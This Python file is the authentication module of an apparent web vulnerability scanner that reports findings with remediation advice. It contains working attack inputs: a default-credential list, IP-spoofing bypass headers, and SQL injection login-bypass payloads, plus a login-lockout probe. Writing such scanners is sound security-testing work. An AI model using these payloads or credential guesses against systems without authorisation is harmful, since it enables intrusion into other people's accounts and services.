import re
from modules.base import BaseModule


class AuthModule(BaseModule):
    NAME = "auth"
    DESCRIPTION = "Authentication testing - default creds, header bypass, param injection"

    DEFAULT_CREDS = [
        ("admin", "admin"), ("admin", "password"), ("admin", ""),
        ("admin", "123456"), ("root", "root"), ("root", "toor"),
        ("admin", "admin123"), ("user", "user"), ("test", "test"),
        ("administrator", "administrator"),
    ]

    LOGIN_PATHS = [
        "/login", "/login.php", "/admin/login", "/admin/login.php",
        "/admin", "/admin/index.php", "/wp-login.php", "/user/login",
        "/signin", "/sign-in", "/auth/login",
    ]

    BYPASS_HEADERS = {
        "X-Forwarded-For":  "127.0.0.1",
        "X-Remote-IP":      "127.0.0.1",
        "X-Remote-Addr":    "127.0.0.1",
        "X-Originating-IP": "127.0.0.1",
        "X-Real-IP":        "127.0.0.1",
    }

    def run(self):
        self.log.info("[auth] Testing authentication")
        login_url = self._find_login()
        if not login_url:
            self.log.debug("[auth] No login page found")
            return
        self._test_default_creds(login_url)
        self._test_header_bypass(login_url)
        self._test_sql_auth_bypass(login_url)
        self._test_lockout_signal(login_url)

    def _find_login(self):
        for form in self.results.meta.get("crawl", {}).get("forms", []):
            if form.get("has_password"):
                self._login_fields = self._field_names(form.get("inputs", []))
                return form.get("action")

        for path in self.LOGIN_PATHS:
            resp = self.get(path)
            if resp and resp.status_code == 200 and re.search(
                r'<input[^>]+type=["\']password["\']', resp.text, re.I
            ):
                inputs = re.findall(r'<input[^>]+name=["\']([^"\']+)["\']', resp.text, re.I)
                self._login_fields = self._field_names(inputs)
                return self.url(path)
        return None

    def _success(self, resp) -> bool:
        if not resp:
            return False
        low = resp.text.lower()
        return any(kw in low for kw in
                   ["dashboard", "logout", "welcome", "profile", "account"])

    def _test_default_creds(self, login_url: str):
        resp0 = self.get(login_url)
        if not resp0:
            return
        token = self._extract_csrf(resp0.text)
        creds = self.DEFAULT_CREDS if self.settings.is_aggressive() else self.DEFAULT_CREDS[:4]
        for user, pwd in creds:
            data = self._credential_data(user, pwd)
            if token:
                data["csrf_token"] = token
            r = self.post(login_url, data=data)
            if self._success(r):
                self.add_finding(
                    severity="CRITICAL",
                    title="Default credentials accepted",
                    url=login_url,
                    detail=f"Login succeeded with '{user}' / '{pwd}'.",
                    payload=f"{user}:{pwd}",
                    remediation="Enforce strong, unique credentials and account lockout.",
                )
                return

    def _test_header_bypass(self, login_url: str):
        r = self.get(login_url, headers=self.BYPASS_HEADERS)
        if self._success(r):
            self.add_finding(
                severity="HIGH",
                title="Authentication bypass via IP-spoofing headers",
                url=login_url,
                detail="Access granted when forging X-Forwarded-For: 127.0.0.1.",
                remediation="Do not trust X-Forwarded-For for access control decisions.",
            )

    def _test_sql_auth_bypass(self, login_url: str):
        sqli_creds = [
            ("' OR '1'='1' --", "x"),
            ("admin'--", "x"),
            ("' OR 1=1--", "x"),
        ]
        for user, pwd in sqli_creds:
            r = self.post(login_url, data=self._credential_data(user, pwd))
            if self._success(r):
                self.add_finding(
                    severity="CRITICAL",
                    title="SQL Injection authentication bypass",
                    url=login_url,
                    detail=f"Login succeeded with SQLi payload '{user}'.",
                    payload=user,
                    remediation="Use parameterised queries for all authentication queries.",
                )
                return

    def _test_lockout_signal(self, login_url: str):
        statuses = []
        attempts = 8 if self.settings.is_aggressive() else 4
        for i in range(1, attempts + 1):
            resp = self.post(login_url, data=self._credential_data("vulxor-test", f"wrong-{i}"))
            if resp:
                statuses.append(resp.status_code)
        if len(statuses) >= min(5, attempts) and all(code not in (401, 403, 423, 429) for code in statuses[-3:]):
            self.add_finding(
                severity="LOW",
                title="No obvious login lockout signal",
                url=login_url,
                detail="Multiple failed login attempts did not return a lockout or rate-limit status.",
                evidence=f"Observed status codes: {statuses}",
                remediation="Use account lockout, throttling, or risk-based controls for repeated failed logins.",
            )

    def _extract_csrf(self, html: str):
        m = re.search(
            r'<input[^>]+name=["\'](?:csrf[_-]?token|_token)["\'][^>]+value=["\']([^"\']+)["\']',
            html, re.I
        )
        return m.group(1) if m else None

    def _field_names(self, inputs):
        user_field = "username"
        pass_field = "password"
        for name in inputs:
            low = name.lower()
            if low in ("user", "username", "email", "login", "userid"):
                user_field = name
            if "pass" in low or low in ("pwd", "password"):
                pass_field = name
        return user_field, pass_field

    def _credential_data(self, user, password):
        user_field, pass_field = getattr(self, "_login_fields", ("username", "password"))
        return {user_field: user, pass_field: password}
